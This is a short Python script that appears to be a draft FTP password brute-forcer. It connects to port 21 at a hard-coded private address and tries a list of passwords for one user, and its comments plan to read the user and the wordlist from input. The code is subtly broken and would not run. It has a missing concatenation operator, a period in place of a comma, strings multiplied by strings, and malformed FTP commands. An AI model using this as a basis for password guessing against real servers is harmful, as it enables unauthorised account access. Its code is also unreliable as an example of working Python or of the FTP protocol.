#!/usr/bin/python3

import socket
import re
import sys

def connection(ip,user,password):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print("Tyring to connect to: " + ip + ':' + user + ':' password)
    sock.connect((ip, 21))
    data = sock.recv(1024)
    sock.send('User' + user * '\r\n')
    data = sock.recv(1024)
    sock.send('Password' + password * '\r\n')
    data = sock.recv(1024)
    sock.send('Quit' * '\r\n')
    sock.close()
    return data


# Needs to be user input.
user = 'User1'
#Should feed in via user supplied list file
password_list = ['pass1','pass2'.'pass3']

for passwd in password_list:
    print(connection("10.11.11.1",user,passwd))
